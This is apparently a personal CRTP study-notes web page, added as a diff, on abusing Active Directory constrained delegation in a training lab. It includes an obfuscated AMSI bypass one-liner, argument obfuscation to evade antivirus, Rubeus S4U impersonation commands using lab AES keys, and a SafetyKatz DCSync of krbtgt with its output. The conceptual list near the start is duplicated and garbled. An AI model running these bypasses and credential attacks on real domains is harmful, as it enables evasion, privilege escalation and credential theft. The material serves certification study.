@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Constrained Delegation - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="active">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Constrained Delegation</header>
+        <section class="about-text">
+          <div class="notion-content">
+<h3>Constrained Delegation</h3>
+<p>Constrained Delegation is a feature in Active Directory (AD) that allows a service to impersonate a user to access specific resources within a domain. 
+While it provides improved security and control over Unconstrained Delegation, it still poses significant risks if not properly configured and monitored.</p>
+<h3>How Constrained Delegation Works</h3>
+<p>When a service is configured for Constrained Delegation, it is given a list of specific resources that it is allowed to access on behalf of a user. This list is stored in the <code>msDS-AllowedToDelegateTo</code> attribute of the service account. When the service attempts to access a resource, the domain controller checks the list of allowed resources and allows the access only if the resource is in the list.</p>
+<h3>Main Differences between Unconstrained and Constrained Delegation</h3>
+<ol>
+<li>Scope of Delegation:</li>
+<li>Unconstrained Delegation: Allows a service to impersonate a user to access any service in the same domain.</li>
+<li>
+<p>Constrained Delegation: Allows a service to impersonate a user to access specific resources or services that are specified in themsDS-AllowedToDelegateToattribute.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Allows a service to impersonate a user to access any service in the same domain.</p>
+</li>
+<li>
+<p>Constrained Delegation: Allows a service to impersonate a user to access specific resources or services that are specified in the msDS-AllowedToDelegateTo attribute.</p>
+</li>
+<li>
+<p>Security:</p>
+</li>
+<li>Unconstrained Delegation: Provides a higher risk of unauthorized access and lateral movement, as a compromised service can impersonate any user.</li>
+<li>
+<p>Constrained Delegation: Reduces the attack surface by limiting the resources that a service can access on behalf of a user.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Provides a higher risk of unauthorized access and lateral movement, as a compromised service can impersonate any user.</p>
+</li>
+<li>
+<p>Constrained Delegation: Reduces the attack surface by limiting the resources that a service can access on behalf of a user.</p>
+</li>
+<li>
+<p>Configuration:</p>
+</li>
+<li>Unconstrained Delegation: Requires a single checkbox to be enabled in the ADUC management console.</li>
+<li>
+<p>Constrained Delegation: Requires more complex configuration, as it involves specifying the list of allowed resources or services in themsDS-AllowedToDelegateToattribute.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Requires a single checkbox to be enabled in the ADUC management console.</p>
+</li>
+<li>
+<p>Constrained Delegation: Requires more complex configuration, as it involves specifying the list of allowed resources or services in the msDS-AllowedToDelegateTo attribute.</p>
+</li>
+<li>
+<p>Impact on Security:</p>
+</li>
+<li>Unconstrained Delegation: Can lead to significant damage if abused, as it allows a service to impersonate any user.</li>
+<li>
+<p>Constrained Delegation: Reduces the risk of unauthorized access and lateral movement, as it limits the resources that a service can access on behalf of a user.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Can lead to significant damage if abused, as it allows a service to impersonate any user.</p>
+</li>
+<li>
+<p>Constrained Delegation: Reduces the risk of unauthorized access and lateral movement, as it limits the resources that a service can access on behalf of a user.</p>
+</li>
+<li>
+<p>Detection and Mitigation:</p>
+</li>
+<li>Unconstrained Delegation: Can be detected by monitoring Kerberos traffic and examining Windows events.</li>
+<li>
+<p>Constrained Delegation: Can be detected by monitoring themsDS-AllowedToDelegateToattribute and examining Windows events.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Can be detected by monitoring Kerberos traffic and examining Windows events.</p>
+</li>
+<li>
+<p>Constrained Delegation: Can be detected by monitoring the msDS-AllowedToDelegateTo attribute and examining Windows events.</p>
+</li>
+<li>
+<p>Best Practices:</p>
+</li>
+<li>Unconstrained Delegation: Should be disabled and replaced with constrained delegation wherever possible.</li>
+<li>
+<p>Constrained Delegation: Should be used with caution and monitored closely to ensure that it is configured correctly.</p>
+</li>
+<li>
+<p>Unconstrained Delegation: Should be disabled and replaced with constrained delegation wherever possible.</p>
+</li>
+<li>
+<p>Constrained Delegation: Should be used with caution and monitored closely to ensure that it is configured correctly.</p>
+</li>
+</ol>
+<h3>Conclusion</h3>
+<p>Unconstrained delegation is a more dangerous configuration that allows a service to impersonate any user, while constrained delegation is a more secure configuration that limits the resources that a service can access on behalf of a user.</p>
+<h1>Abusing Constrained Delegation with User Accounts</h1>
+<h2>Enumeration</h2>
+<p>To enumerate User accounts with Delegation Rights assigned, Powerview.ps1 can be used.
+Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell bypass script blocking mechanisms and bypass AMSI as well.</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
+</code></pre></div>
+
+<p>Enumerating Constrained delegation using PowerView.</p>
+<p><code>. .\PowerView.ps1</code></p>
+<p><code>Get-DomainUser -TrustedToAuth</code></p>
+<p>The output from the <code>Get-DomainUser</code> command in PowerView, specifically with the <code>-TrustedToTauth</code> parameter, provides information about the users who have been granted Constrained Delegation (CD) rights. Here's a breakdown of the output:</p>
+<ul>
+<li>
+<p>UserPrincipalName: This is the username in the format websvc.</p>
+</li>
+<li>
+<p>msds-allowedtodelegateto: This field lists the services or computers that the user is allowed to delegate to. In this case, the user websvc is allowed to delegate to two services: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL and CIFS/dcorp-mssql. These are likely SQL Server services.</p>
+</li>
+<li>
+<p>UserAccountControl: This field provides additional information about the user's account settings. In this case, the user websvc has the following settings:</p>
+</li>
+<li>NORMAL_ACCOUNT: The user is a normal user account.</li>
+<li>DONT_EXPIRE_PASSWORD: The user's password does not expire.</li>
+<li>
+<p>TRUSTED_TO_AUTH_FOR_DELEGATION: The user has been granted Constrained Delegation rights, which allows them to impersonate other users or services for specific tasks.</p>
+</li>
+<li>
+<p>NORMAL_ACCOUNT: The user is a normal user account.</p>
+</li>
+<li>
+<p>DONT_EXPIRE_PASSWORD: The user's password does not expire.</p>
+</li>
+<li>
+<p>TRUSTED_TO_AUTH_FOR_DELEGATION: The user has been granted Constrained Delegation rights, which allows them to impersonate other users or services for specific tasks.</p>
+</li>
+</ul>
+<p>In summary, the output indicates that the user <code>websvc</code> has been granted Constrained Delegation rights, allowing them to delegate to specific services like SQL Server.</p>
+<p>For this attack we can user KEKEO or RUBEUS.</p>
+<h2>Constrained Delegation With Rubeus.</h2>
+<p>Let’s assume that we have compromised WEBSVC user credentials like NTLM or AES256 key before, we can abuse the Constrained Delegation assigned to this user.
+Note: I’ll be using AES256 key, since it’s more stealthy.</p>
+<p><code>Username : websvc</code></p>
+<p><code>Password : AServicewhichIsNotM3@nttoBe</code></p>
+<p><code>aes256_hmac:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSpli.bat</p>
+<p><code>s4u</code></p>
+<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=u&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=4&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now we can execute the Rubeus payload.</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt</code></p>
+<p>Here's a breakdown of the command:</p>
+<ul>
+<li>
+<p>Loader.exe: This is a tool used to load and execute other tools, such as Rubeus.</p>
+</li>
+<li>
+<p>path: Specifies the path to the Rubeus executable.</p>
+</li>
+<li>
+<p>args: Specifies the arguments to be passed to Rubeus.</p>
+</li>
+<li>
+<p>%Pwn%: This is a placeholder for the command to be executed.</p>
+</li>
+<li>
+<p>/user:websvc: Specifies the user to impersonate (websvc).</p>
+</li>
+<li>
+<p>/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7: Specifies the AES256 hash for the user websvc.</p>
+</li>
+<li>
+<p>/impersonateuser:Administrator: Specifies the user to impersonate (Administrator).</p>
+</li>
+<li>
+<p>/msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL": Specifies the service to impersonate (CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL).</p>
+</li>
+<li>
+<p>/ptt: This flag tells Rubeus to use the obtained TGS to access the service.</p>
+</li>
+</ul>
+<p>This command will request a TGS for the domain administrator account using the <code>websvc</code> user's credentials and then use that TGS to access the <code>CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL</code> service as the domain administrator.</p>
+<p>Now let’s see if the ticket has been injected into our Cached Tickets as Administrator.
+<code>klist</code></p>
+<p>Above we can see that we have it into our Cached Tickets as Administrator.</p>
+<p><code>dir \\dcorp-mssql.dollarcorp.moneycorp.local\C$</code></p>
+<p>Above we can see that we were able to abuse the Constrained Delegation assigned to user websvc into DCORP-MSSQL.</p>
+<h1>Abusing Constrained Delegation with Computer accounts</h1>
+<h2>Enumeration</h2>
+<p>To enumerate User accounts with Delegation Rights assigned, Powerview.ps1 can be used.
+Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell bypass script blocking mechanisms and bypass AMSI as well.</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
+</code></pre></div>
+
+<p>Enumerating Constrained delegation using PowerView.</p>
+<p><code>. .\PowerView.ps1</code></p>
+<p><code>Get-DomainComputer -TrustedToAuth</code></p>
+<p>The provided output is from the <code>Get-DomainComputer</code> command in PowerView, which is used to enumerate domain computers. 
+Here's a breakdown of the output:</p>
+<ol>
+<li>
+<p>samaccountname: This is the SAM account name of the computer, which is DCORP-ADMINSRV$.</p>
+</li>
+<li>
+<p>samaccounttype: This indicates the type of account. In this case, it is a machine account (MACHINE_ACCOUNT).</p>
+</li>
+<li>
+<p>useraccountcontrol: This is a bit mask that defines the user account properties. In this case, it includes WORKSTATION_TRUST_ACCOUNT and TRUSTED_TO_AUTH_FOR_DELEGATION. These flags indicate that the computer is a workstation and is trusted to authenticate for delegation.</p>
+</li>
+<li>
+<p>msds-allowedtodelegateto: This is a list of trusted computers that this computer is allowed to delegate to. In this case, it includes TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL and TIME/dcorp-DC. These are the domain controllers that this computer is allowed to delegate to.</p>
+</li>
+</ol>
+<p>Let’s assume that we have compromised <code>DCORP-ADMINSRV$</code> computer account credentials and we will use it to abuse this Constrained Delegation.
+Note: I’ll be using AES256 key since it’s more stealthy, but NTLM has could also be used.</p>
+<p><code>ComputerName: dcorp-adminsrv$</code></p>
+<p><code>NTLM:b5f451985fd34d58d5120816d31b5565</code></p>
+<p><code>aes256_hmac:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSpli.bat</p>
+<p><code>s4u</code></p>
+<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=u&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=4&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now we can execute the Rubeus payload.</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt</code></p>
+<p>Let’s check if the ticket has been imported into our Cached Tickets.</p>
+<p><code>klist</code></p>
+<p>Now we can use SafetyKatz to DCSync.</p>
+<p>ArgSplit.bat</p>
+<p><code>lsadump::dcsync</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span>
+<span class="nb">set </span><span class="s2">&quot;z=c&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=n&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=y&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=c&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=d&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;t=:&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;s=:&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;r=p&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;q=m&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;p=u&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;o=d&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;n=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;m=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;l=l&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Once we have encoded the payload  then we can execute SafetyKatz to request any domain secrets.</p>
+<p><code>C:\AD\Tools&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit”</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># lsadump::dcsync /user:dcorp\krbtgt</span>
+<span class="no">[DC]</span> <span class="s1">&#39;dollarcorp.moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+<span class="no">[DC]</span> <span class="s1">&#39;dcorp-dc.dollarcorp.moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+<span class="no">[DC]</span> <span class="s1">&#39;dcorp\krbtgt&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+<span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
+<span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
+
+<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
+
+<span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
+
+<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
+<span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
+<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
+<span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
+<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">11</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">41</span> <span class="n">PM</span>
+<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">502</span>
